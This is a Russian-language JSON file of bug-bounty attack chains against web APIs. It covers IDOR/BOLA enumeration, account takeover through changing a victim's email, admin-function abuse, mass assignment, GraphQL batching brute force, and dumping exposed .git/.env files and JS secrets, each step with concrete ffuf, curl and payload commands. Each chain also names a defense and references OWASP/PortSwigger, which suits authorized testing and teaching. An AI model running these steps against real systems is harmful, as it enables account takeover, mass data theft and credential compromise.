@@ -1,0 +1,533 @@
+{
+  "domain": "API",
+  "domainLabel": "API / GraphQL / доступ",
+  "domainOrder": 8,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "REST IDOR: перебор объектов до захвата аккаунта (numeric + UUID)",
+      "level": "newbie",
+      "impact": "Чтение/изменение данных любого пользователя и полный захват аккаунта через смену email, ATO в зрелых программах.",
+      "why": "Баги на ссылки к объектам это самая частая и доходная находка для новичка, ведущая прямо к захвату аккаунта.",
+      "precondition": "Авторизованное приложение, передающее id объекта в URL или теле (/api/users/1007, ?account_id=, \"userId\":), и второй тестовый аккаунт для сравнения.",
+      "tags": [
+        "idor",
+        "bola",
+        "ato",
+        "access-control"
+      ],
+      "realWorld": "PortSwigger WSA 'Insecure direct object references' labs; OWASP API1:2023 BOLA; recurring HackerOne ATO-via-email-change reports.",
+      "defense": "Проверять владение объектом на сервере (не только аутентификацию); алертить на 200, где запросивший не равен владельцу ресурса.",
+      "steps": [
+        {
+          "title": "Найти все запросы с id объекта",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "proxy normal usage through Burp; flag /api/users/{id}, ?id=, \"userId\" in bodies; baseline GET /api/users/1007 (your id) = 200 + your data"
+        },
+        {
+          "title": "Уменьшить/увеличить id вручную",
+          "kind": "note",
+          "detail": "in Repeater change 1007 -> 1006/1008",
+          "success": "200 с чужим PII в ответе = IDOR"
+        },
+        {
+          "title": "Автоматизировать перебор",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/users/FUZZ -H \"Cookie: session=...\" -w <(seq 1 5000) -mc 200 -fs <baseline-len>"
+        },
+        {
+          "title": "Подтвердить через второй аккаунт",
+          "kind": "script",
+          "q": "authz_matrix.py - матрица авторизации (BOLA/no-auth)",
+          "detail": "Autorize: log in as user B, set user A token as low-priv, replay; 'Authz bypassed!' = real"
+        },
+        {
+          "title": "UUID-вариант: собрать и переиграть",
+          "kind": "note",
+          "q": "",
+          "detail": "pull other users' UUIDs from list endpoints/shared links/emails, replay GET /api/users/{leaked-uuid}"
+        },
+        {
+          "title": "Поднять чтение до записи",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PUT /api/users/1006 {\"email\":\"{EMAIL}\"}",
+          "success": "200 и email жертвы изменён"
+        },
+        {
+          "title": "Сбросить пароль и захватить аккаунт",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "request reset; token lands on attacker email -> set new password -> ATO"
+        }
+      ]
+    },
+    {
+      "title": "BOLA: массовый сбор PII через /api/{id}",
+      "level": "newbie",
+      "impact": "Массовая выгрузка чужих записей (заказы, счета, тикеты, файлы) = отчётная утечка данных в зависимости от чувствительности и объёма.",
+      "why": "API отдаёт много типов объектов помимо профиля, и именно массовость поднимает выплату.",
+      "precondition": "REST API с эндпоинтами объектов вида /api/orders/{id}, /api/invoices/{id}, /api/documents/{uuid} и одна валидная сессия.",
+      "tags": [
+        "bola",
+        "idor",
+        "pii",
+        "access-control"
+      ],
+      "realWorld": "OWASP API1:2023 BOLA; PortSwigger API testing methodology; common HackerOne 'access other users orders/invoices' reports.",
+      "defense": "Middleware авторизации на уровне объекта по паре (вызывающий, владелец); ограничивать скорость и детектить последовательный перебор id.",
+      "steps": [
+        {
+          "title": "Перечислить все маршруты с объектами",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "from Swagger/JS/proxy history list /api/{orders,invoices,tickets,documents}/{id}"
+        },
+        {
+          "title": "Подтвердить BOLA межаккаунтным повтором",
+          "kind": "script",
+          "q": "authz_matrix.py - матрица авторизации (BOLA/no-auth)",
+          "detail": "Autorize two sessions; request user B's /api/orders/9001 as user A",
+          "success": "200 на чужой объект = BOLA"
+        },
+        {
+          "title": "Определить пространство id",
+          "kind": "note",
+          "q": "",
+          "detail": "sequential ints -> enumerable; random UUID -> pivot to harvest-and-replay"
+        },
+        {
+          "title": "Массово перечислить валидные записи",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/invoices/FUZZ -w <(seq 1 20000) -H \"Authorization: Bearer ...\" -mc 200 -fr \"not found\""
+        },
+        {
+          "title": "Выгрузить и посчитать масштаб",
+          "kind": "note",
+          "detail": "loop hits: curl -s -H \"Authorization: Bearer ...\" https://t/api/invoices/$ID | jq '{id,email,total}'; count unique victims"
+        },
+        {
+          "title": "Проверить запись (write-side BOLA)",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PATCH /api/orders/9001 {\"shipping_address\":\"...\"} as another user; 200 = tamper others' objects"
+        },
+        {
+          "title": "Собрать доказательство импакта",
+          "kind": "checklist",
+          "q": "idor",
+          "detail": "redacted sample of N victims + the single decisive request/response pair"
+        }
+      ]
+    },
+    {
+      "title": "BFLA: обычный пользователь вызывает админ-функции",
+      "level": "intermediate",
+      "impact": "Выполнение админ-операций под обычным пользователем (создание юзеров, смена ролей, удаление/чтение всех данных), часто полная компрометация админки.",
+      "why": "Авторизацию часто проверяют только в UI/меню, тогда как админский API всё ещё отвечает на токен с низкими правами.",
+      "precondition": "Приложение с разделением ролей и привилегированными эндпоинтами (/api/admin/*, действия с ролями) и аккаунт с низкими правами.",
+      "tags": [
+        "bfla",
+        "access-control",
+        "privesc",
+        "rbac"
+      ],
+      "realWorld": "OWASP API5:2023 BFLA; PortSwigger 'Broken function level authorization' labs; recurring admin-API-via-normal-user reports.",
+      "defense": "Централизованный RBAC, по умолчанию запрещающий, применяемый на шлюзе/сервере для каждого привилегированного маршрута и метода.",
+      "steps": [
+        {
+          "title": "Найти админ/привилегированные маршруты",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/api/admin/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,403 -H \"Authorization: Bearer <low-priv>\""
+        },
+        {
+          "title": "Поискать привилегированные вызовы в доках/JS",
+          "kind": "note",
+          "q": "",
+          "detail": "grep Swagger/JS for admin, role, internal, /manage, promote"
+        },
+        {
+          "title": "Повторить админ-действие токеном низких прав",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "POST /api/admin/users {\"email\":\"x\",\"role\":\"admin\"} with low-priv bearer",
+          "success": "200/201 от админ-эндпоинта под low-priv = BFLA"
+        },
+        {
+          "title": "Попробовать подмену HTTP-метода",
+          "kind": "payload",
+          "q": "Обход 403 / контроль доступа",
+          "detail": "flip GET /api/users/9001 to DELETE/PUT, or add header X-HTTP-Method-Override: PUT"
+        },
+        {
+          "title": "Подтвердить матрицей ролей в Autorize",
+          "kind": "script",
+          "q": "authz_matrix.py - матрица авторизации (BOLA/no-auth)",
+          "detail": "admin session as enforcement baseline, low-priv as test; 'Bypassed!' on admin routes"
+        },
+        {
+          "title": "Доказать privesc: повысить пользователя до admin",
+          "kind": "payload",
+          "q": "Insecure Direct Object References",
+          "detail": "PUT /api/users/9001/role {\"role\":\"admin\"} as low-priv -> re-login, confirm elevation"
+        },
+        {
+          "title": "Свести к контролю данных/аккаунта",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "use the new admin function to dump users or reset a victim password"
+        }
+      ]
+    },
+    {
+      "title": "Избыточная выдача данных: API отдаёт то, что прячет UI",
+      "level": "newbie",
+      "impact": "Сбор чувствительных полей, которые клиент не показывает (хэши паролей, токены сброса, api_key, PII, внутренние флаги), как трамплин к развитию.",
+      "why": "Самая лёгкая победа в API: ничего не меняешь, просто читаешь полный JSON, который сервер отдаёт с избытком.",
+      "precondition": "Любой JSON API за веб- или мобильным клиентом.",
+      "tags": [
+        "excessive-data-exposure",
+        "bopla",
+        "info-disclosure",
+        "api"
+      ],
+      "realWorld": "OWASP API3:2023 Broken Object Property Level Authorization (ex-Excessive Data Exposure, API3:2019); PortSwigger API testing notes.",
+      "defense": "Формировать ответ по allow-list на сервере (сериализатор); никогда не полагаться на клиента для скрытия полей.",
+      "steps": [
+        {
+          "title": "Читать сырой JSON, а не отрисованный UI",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "in Burp, diff fields shown on screen vs the full response body",
+          "success": "в JSON есть поля, которых нет в UI"
+        },
+        {
+          "title": "Искать ценные ключи",
+          "kind": "note",
+          "detail": "grep -iE '\"(password|token|hash|ssn|secret|role|is_admin|email|phone)\"' response.json"
+        },
+        {
+          "title": "Тянуть полные объекты self/detail",
+          "kind": "note",
+          "q": "",
+          "detail": "GET /api/users/me often returns more than the profile page (api_key, reset_token)"
+        },
+        {
+          "title": "Проверить вложенные чужие данные",
+          "kind": "note",
+          "q": "",
+          "detail": "list endpoints like /api/feed, /api/orders sometimes inline other users' records"
+        },
+        {
+          "title": "Сравнить мобильный и веб API",
+          "kind": "note",
+          "q": "",
+          "detail": "mobile /v1/ endpoints frequently overshare; proxy the app, replay in Repeater"
+        },
+        {
+          "title": "Развить утёкшее поле",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "if reset_token/api_key leaks, use it directly: reset victim password or call the API as them"
+        }
+      ]
+    },
+    {
+      "title": "Mass Assignment + HPP: повышение привилегий",
+      "level": "intermediate",
+      "impact": "Установка скрытых привилегированных атрибутов, которыми не должен управлять (role, is_admin, verified, balance, tenant_id) -> privesc или финансовый импакт.",
+      "why": "Фреймворки автоматически связывают JSON с моделью, поэтому лишние ключи тихо приживаются, когда бэкенд забыл про allow-list.",
+      "precondition": "Эндпоинты записи, привязывающие тело запроса к объекту (регистрация, обновление профиля, создание заказа).",
+      "tags": [
+        "mass-assignment",
+        "hpp",
+        "privesc",
+        "bopla"
+      ],
+      "realWorld": "OWASP API3:2023 (BOPLA) Mass Assignment + OWASP HTTP Parameter Pollution; classic Rails/GitHub 'create_admin' cases.",
+      "defense": "Строгие server-side allow-list для привязываемых полей; канонизировать и отклонять дублирующиеся параметры на шлюзе.",
+      "steps": [
+        {
+          "title": "Снять baseline записи профиля/регистрации",
+          "kind": "note",
+          "q": "",
+          "detail": "baseline PUT /api/users/me {\"name\":\"...\"} in Repeater"
+        },
+        {
+          "title": "Найти скрытые параметры",
+          "kind": "script",
+          "q": "Parameter discovery sources (gau+katana -> unfurl -> arjun)",
+          "detail": "arjun -u https://t/api/users/me -m JSON  (or Burp Param Miner: guess JSON params)"
+        },
+        {
+          "title": "Внедрить привилегированные ключи",
+          "kind": "payload",
+          "q": "Mass Assignment",
+          "detail": "add \"role\":\"admin\", \"is_admin\":true, \"email_verified\":true, \"tenant_id\":1",
+          "success": "повторный GET показывает role=admin / поднятые права"
+        },
+        {
+          "title": "Зеркалить имена полей из GET",
+          "kind": "note",
+          "q": "",
+          "detail": "whatever the object returns (isStaff, plan) is a mass-assignment candidate on write"
+        },
+        {
+          "title": "HPP: отправить дублирующиеся параметры",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "user_id=me&user_id=9001 or role=user&role=admin; back-end may take first/last/array"
+        },
+        {
+          "title": "HPP между слоями парсинга",
+          "kind": "payload",
+          "q": "HTTP Parameter Pollution",
+          "detail": "try query-vs-body duplicates and role[]=admin; proxy and back-end disagree -> authz bypass"
+        },
+        {
+          "title": "Подтвердить привилегию",
+          "kind": "checklist",
+          "q": "mass-assignment",
+          "detail": "re-login or call an admin-only route; elevated access = proven"
+        }
+      ]
+    },
+    {
+      "title": "GraphQL: интроспекция, чувствительные поля, batching и алиасы",
+      "level": "intermediate",
+      "impact": "Полное раскрытие схемы -> запрос чувствительных полей, обход рейт-лимитов через batching/алиасы (credential stuffing, перебор OTP), эксплуатация дыр field-level authz.",
+      "why": "Один запрос интроспекции выдаёт весь контракт API, включая поля и мутации, которые UI никогда не вызывает.",
+      "precondition": "Доступный GraphQL-эндпоинт (/graphql, /api/graphql, /v1/graphql).",
+      "tags": [
+        "graphql",
+        "introspection",
+        "batching",
+        "access-control"
+      ],
+      "realWorld": "PortSwigger 'GraphQL API vulnerabilities' labs; HackTricks GraphQL; common HackerOne GraphQL authz/batching reports.",
+      "defense": "Отключить интроспекцию в проде, применять field-level authz, ограничивать глубину/число алиасов/размер батча и rate-limit по операции.",
+      "steps": [
+        {
+          "title": "Найти эндпоинт",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w graphql-paths.txt -mc 200  for graphql, graphiql, v1/graphql, api/graphql"
+        },
+        {
+          "title": "Запустить запрос интроспекции",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "POST {\"query\":\"{__schema{types{name fields{name}}}}\"}",
+          "success": "вернулся полный список типов = интроспекция включена"
+        },
+        {
+          "title": "Автоматически восстановить схему",
+          "kind": "note",
+          "detail": "InQL (Burp), or clairvoyance https://t/graphql -o schema.json -w words.txt if introspection is disabled"
+        },
+        {
+          "title": "Запросить чувствительные поля напрямую",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "query{users{id email phone passwordResetToken}}; data back = field-level authz gap"
+        },
+        {
+          "title": "Проверить field-level authz по узлам (BOLA в GraphQL)",
+          "kind": "note",
+          "q": "",
+          "detail": "as a normal user, user(id:9001){email} of someone else returning data = broken object authz"
+        },
+        {
+          "title": "Обойти рейт-лимит алиасами и batching",
+          "kind": "payload",
+          "q": "GraphQL Injection",
+          "detail": "aliases: mutation{a:login(u:\"x\",p:\"1\"){t} b:login(u:\"x\",p:\"2\"){t}}; or send JSON array [{\"query\":...},{\"query\":...}] for OTP/credential brute"
+        },
+        {
+          "title": "Прощупать мутации на privesc",
+          "kind": "checklist",
+          "q": "graphql",
+          "detail": "mutation{updateUser(id:9001,role:ADMIN){id}} using args you already read from the schema"
+        }
+      ]
+    },
+    {
+      "title": "Открытые /.git и .env: исходники и живые секреты",
+      "level": "newbie",
+      "impact": "Полное восстановление исходников плюс захардкоженные секреты (креды БД, облачные ключи, секрет подписи JWT) -> часто прямая компрометация сервера/данных.",
+      "why": "Один кривой деплой отдаёт весь код и рабочие ключи без всякой аутентификации.",
+      "precondition": "Веб-корень, отдающий артефакты VCS/конфигов (/.git/, /.env, бэкапы или листинг каталога).",
+      "tags": [
+        "git-exposure",
+        "env-leak",
+        "secrets",
+        "info-disclosure"
+      ],
+      "realWorld": "git-dumper tooling; numerous disclosed .git/.env exposure reports on HackerOne; general technique.",
+      "defense": "Блокировать dotfiles/VCS-каталоги на веб-сервере, хранить секреты в vault вне веб-корня и ротировать сразу при утечке.",
+      "steps": [
+        {
+          "title": "Прощупать открытые артефакты VCS/конфигов",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w <list> -mc 200  for .git/HEAD, .env, .git/config, config.php.bak, .svn/"
+        },
+        {
+          "title": "Убедиться, что /.git листается",
+          "kind": "note",
+          "q": "",
+          "detail": "curl -s https://t/.git/HEAD",
+          "success": "ref: refs/heads/main = репозиторий выкачивается"
+        },
+        {
+          "title": "Слить весь репозиторий",
+          "kind": "note",
+          "detail": "git-dumper https://t/.git/ ./loot"
+        },
+        {
+          "title": "Или выкачать листингованный каталог",
+          "kind": "note",
+          "detail": "if listing is on: wget -r -np https://t/backup/"
+        },
+        {
+          "title": "Прошерстить дамп на секреты",
+          "kind": "script",
+          "q": "CI / repo secrets grep (AKIA / AIza / xox / ghp_ / .tfstate)",
+          "detail": "trufflehog filesystem ./loot --only-verified  and  gitleaks detect -s ./loot"
+        },
+        {
+          "title": "Прочитать .env напрямую",
+          "kind": "note",
+          "detail": "curl -s https://t/.env  for DB_PASSWORD=, AWS_SECRET_ACCESS_KEY=, JWT_SECRET="
+        },
+        {
+          "title": "Развить через найденные секреты",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "use DB creds / cloud keys / forge JWTs signed with the leaked secret"
+        }
+      ]
+    },
+    {
+      "title": "Открытые API-доки (Swagger/OpenAPI/Postman): вся поверхность атаки",
+      "level": "newbie",
+      "impact": "Полная авторитетная карта эндпоинтов и параметров (часто с недокументированными admin/debug-маршрутами), мгновенно питающая IDOR/BFLA/mass-assignment.",
+      "why": "Зачем угадывать эндпоинты, если сервер сам публикует спеку? Это самый быстрый путь к полному покрытию поверхности.",
+      "precondition": "Открытая документация или схема API (/swagger, /openapi.json, /api-docs, коллекция Postman или GraphQL playground).",
+      "tags": [
+        "swagger",
+        "openapi",
+        "api-docs",
+        "recon"
+      ],
+      "realWorld": "OWASP API testing methodology; common exposed-Swagger / public-Postman-collection reports; general technique.",
+      "defense": "Не выкатывать интерактивные доки/спеки в прод без аутентификации; закрывать /swagger, /api-docs и playground за авторизацией.",
+      "steps": [
+        {
+          "title": "Найти доки/спеку",
+          "kind": "command",
+          "q": "ffuf",
+          "detail": "ffuf -u https://t/FUZZ -w <list> -mc 200  for swagger-ui.html, openapi.json, api-docs, v2/api-docs, graphiql",
+          "success": "200 на swagger/openapi = спека доступна"
+        },
+        {
+          "title": "Скачать машиночитаемую спеку",
+          "kind": "note",
+          "detail": "curl -s https://t/openapi.json -o spec.json  (or swagger.json)"
+        },
+        {
+          "title": "Импортировать в клиент для запросов в один клик",
+          "kind": "note",
+          "q": "",
+          "detail": "load spec.json into Postman or Burp's OpenAPI parser to generate every request"
+        },
+        {
+          "title": "Отметить сочные операции",
+          "kind": "checklist",
+          "q": "api-testing",
+          "detail": "sort for admin, delete, internal, debug, {id} path params, and unauth-looking routes"
+        },
+        {
+          "title": "Найти недокументированные версии",
+          "kind": "note",
+          "q": "",
+          "detail": "try /v1 -> /v2/v3 and /internal/ siblings not linked in the UI"
+        },
+        {
+          "title": "Прогнать эндпоинты через authz-тесты",
+          "kind": "script",
+          "q": "authz_matrix.py - матрица авторизации (BOLA/no-auth)",
+          "detail": "run the generated requests through Autorize to mass-check IDOR/BFLA"
+        },
+        {
+          "title": "Открыть GraphQL playground, если есть",
+          "kind": "note",
+          "q": "",
+          "detail": "/graphiql or /playground gives free introspection + a query runner"
+        }
+      ]
+    },
+    {
+      "title": "Майнинг JS-бандлов: скрытые эндпоинты и захардкоженные секреты",
+      "level": "intermediate",
+      "impact": "Недокументированные/админские API-маршруты плюс захардкоженные секреты (API-ключи, конфиги Firebase, токены third-party) в JS фронтенда -> новая поверхность и иногда прямое использование ключа.",
+      "why": "SPA-фронтенды отдают всю карту своего API, а нередко и живые секреты, каждому анонимному посетителю прямо в JS-бандлах.",
+      "precondition": "Тяжёлое на JS веб-приложение (SPA на React/Vue/Angular) со скачиваемыми бандлами.",
+      "tags": [
+        "js-recon",
+        "secrets",
+        "api-key-leak",
+        "recon"
+      ],
+      "realWorld": "LinkFinder / jsluice tooling; recurring 'secrets in JS bundles' HackerOne reports; general technique.",
+      "defense": "Хранить секреты на сервере, сканировать бандлы в CI (trufflehog/gitleaks) и ограничивать/ротировать любой ключ, попадающий на клиент.",
+      "steps": [
+        {
+          "title": "Собрать все JS-URL (текущие + исторические)",
+          "kind": "command",
+          "q": "gau / waybackurls",
+          "detail": "gau target.com | grep '\\.js' > js.txt  and  katana -u https://t -jc -d 3 | grep '\\.js'"
+        },
+        {
+          "title": "Скачать бандлы",
+          "kind": "note",
+          "detail": "cat js.txt | xargs -n1 curl -sO"
+        },
+        {
+          "title": "Извлечь эндпоинты/пути",
+          "kind": "script",
+          "q": "JS endpoint extractor (LinkFinder-style regex, stdlib)",
+          "detail": "linkfinder -i 'https://t/*.js' -o cli  or  jsluice urls main.js  -> collect /api/... routes"
+        },
+        {
+          "title": "Искать захардкоженные секреты",
+          "kind": "script",
+          "q": "JS secret scanner (API keys / tokens / private keys)",
+          "detail": "trufflehog filesystem ./js --only-verified  and  cat js.txt | mantra",
+          "success": "trufflehog помечает verified-секрет (AWS/Google/Firebase/Stripe)"
+        },
+        {
+          "title": "Быстрый поиск строк",
+          "kind": "note",
+          "detail": "grep -roiE '(api[_-]?key|secret|token|firebaseio\\.com|/api/[a-z/]+)' ./js"
+        },
+        {
+          "title": "Проверить найденные эндпоинты",
+          "kind": "note",
+          "q": "",
+          "detail": "replay newly found /api/internal/* in Repeater; many lack the UI's auth gating"
+        },
+        {
+          "title": "Проверить живые ключи",
+          "kind": "checklist",
+          "q": "api-key-leaks",
+          "detail": "check leaked keys: Firebase open DB at /.json, Google Maps key billing, Stripe live/test"
+        }
+      ]
+    }
+  ]
+}
